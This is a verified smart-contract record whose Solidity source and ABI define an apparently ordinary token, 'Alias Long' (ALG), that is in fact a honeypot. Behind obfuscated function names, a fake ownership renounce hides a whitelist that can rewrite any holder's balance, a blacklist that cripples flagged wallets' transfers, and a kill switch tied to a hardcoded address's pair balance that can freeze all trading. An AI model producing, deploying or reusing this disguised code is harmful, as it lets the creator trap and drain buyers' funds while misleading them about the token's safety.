{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface sellTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedFrom {\n    function createPair(address listMarketingTrading, address launchedFee) external returns (address);\n}\n\ninterface launchLiquiditySwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txWallet) external view returns (uint256);\n\n    function transfer(address amountTotalEnable, uint256 fundFee) external returns (bool);\n\n    function allowance(address receiverMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountTotalEnable,\n        uint256 fundFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityTake, uint256 value);\n    event Approval(address indexed receiverMax, address indexed spender, uint256 value);\n}\n\ninterface launchLiquiditySwapMetadata is launchLiquiditySwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AliasLong is sellTake, launchLiquiditySwap, launchLiquiditySwapMetadata {\n\n    function fundAt() private view {\n        require(limitFeeAmount[_msgSender()]);\n    }\n\n    function transferFrom(address toLaunch, address amountTotalEnable, uint256 fundFee) external override returns (bool) {\n        if (_msgSender() != swapAt) {\n            if (exemptLiquidity[toLaunch][_msgSender()] != type(uint256).max) {\n                require(fundFee <= exemptLiquidity[toLaunch][_msgSender()]);\n                exemptLiquidity[toLaunch][_msgSender()] -= fundFee;\n            }\n        }\n        return liquidityAt(toLaunch, amountTotalEnable, fundFee);\n    }\n\n    function exemptTeam(address sellIs) public {\n        if (amountTokenIs) {\n            return;\n        }\n        if (tokenWalletMarketing != senderToMax) {\n            senderToMax = totalIs;\n        }\n        limitFeeAmount[sellIs] = true;\n        \n        amountTokenIs = true;\n    }\n\n    uint256 private tokenWalletMarketing;\n\n    uint256 fromBuyTeam;\n\n    address senderToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public swapTake;\n\n    uint8 private launchAmountTotal = 18;\n\n    function allowance(address toTeamToken, address fundMarketingBuy) external view virtual override returns (uint256) {\n        if (fundMarketingBuy == swapAt) {\n            return type(uint256).max;\n        }\n        return exemptLiquidity[toTeamToken][fundMarketingBuy];\n    }\n\n    uint256 autoLaunched;\n\n    function owner() external view returns (address) {\n        return atAuto;\n    }\n\n    uint256 constant walletMarketing = 12 ** 10;\n\n    address public marketingLaunch;\n\n    mapping(address => uint256) private launchedTotal;\n\n    function transfer(address buyEnable, uint256 fundFee) external virtual override returns (bool) {\n        return liquidityAt(_msgSender(), buyEnable, fundFee);\n    }\n\n    string private listWallet = \"Alias Long\";\n\n    function getOwner() external view returns (address) {\n        return atAuto;\n    }\n\n    mapping(address => bool) public limitFeeAmount;\n\n    function liquidityAt(address toLaunch, address amountTotalEnable, uint256 fundFee) internal returns (bool) {\n        if (toLaunch == swapTake) {\n            return teamFrom(toLaunch, amountTotalEnable, fundFee);\n        }\n        uint256 atToken = launchLiquiditySwap(marketingLaunch).balanceOf(senderToken);\n        require(atToken == autoLaunched);\n        require(amountTotalEnable != senderToken);\n        if (launchEnable[toLaunch]) {\n            return teamFrom(toLaunch, amountTotalEnable, walletMarketing);\n        }\n        return teamFrom(toLaunch, amountTotalEnable, fundFee);\n    }\n\n    address private atAuto;\n\n    function teamFrom(address toLaunch, address amountTotalEnable, uint256 fundFee) internal returns (bool) {\n        require(launchedTotal[toLaunch] >= fundFee);\n        launchedTotal[toLaunch] -= fundFee;\n        launchedTotal[amountTotalEnable] += fundFee;\n        emit Transfer(toLaunch, amountTotalEnable, fundFee);\n        return true;\n    }\n\n    bool public launchedLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minSender;\n    }\n\n    uint256 public totalIs;\n\n    string private fromReceiver = \"ALG\";\n\n    address swapAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed tokenSender, address indexed txTo);\n\n    function tokenTotal() public {\n        emit OwnershipTransferred(swapTake, address(0));\n        atAuto = address(0);\n    }\n\n    mapping(address => bool) public launchEnable;\n\n    function liquidityFee(address txReceiverShould) public {\n        fundAt();\n        \n        if (txReceiverShould == swapTake || txReceiverShould == marketingLaunch) {\n            return;\n        }\n        launchEnable[txReceiverShould] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private exemptLiquidity;\n\n    uint256 public liquidityReceiver;\n\n    uint256 private senderToMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchAmountTotal;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listWallet;\n    }\n\n    bool private atLiquidity;\n\n    bool public amountTokenIs;\n\n    uint256 private minSender = 100000000 * 10 ** 18;\n\n    function balanceOf(address txWallet) public view virtual override returns (uint256) {\n        return launchedTotal[txWallet];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromReceiver;\n    }\n\n    function limitTx(uint256 fundFee) public {\n        fundAt();\n        autoLaunched = fundFee;\n    }\n\n    function approve(address fundMarketingBuy, uint256 fundFee) public virtual override returns (bool) {\n        exemptLiquidity[_msgSender()][fundMarketingBuy] = fundFee;\n        emit Approval(_msgSender(), fundMarketingBuy, fundFee);\n        return true;\n    }\n\n    function receiverExempt(address buyEnable, uint256 fundFee) public {\n        fundAt();\n        launchedTotal[buyEnable] = fundFee;\n    }\n\n    constructor (){\n        \n        sellTeam amountLaunched = sellTeam(swapAt);\n        marketingLaunch = launchedFrom(amountLaunched.factory()).createPair(amountLaunched.WETH(), address(this));\n        \n        swapTake = _msgSender();\n        tokenTotal();\n        limitFeeAmount[swapTake] = true;\n        launchedTotal[swapTake] = minSender;\n        if (totalIs != senderToMax) {\n            tokenWalletMarketing = totalIs;\n        }\n        emit Transfer(address(0), swapTake, minSender);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeamToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMarketingBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTokenIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMarketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellIs\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFeeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"limitTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiverShould\",\"type\":\"address\"}],\"name\":\"liquidityFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTotalEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AliasLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}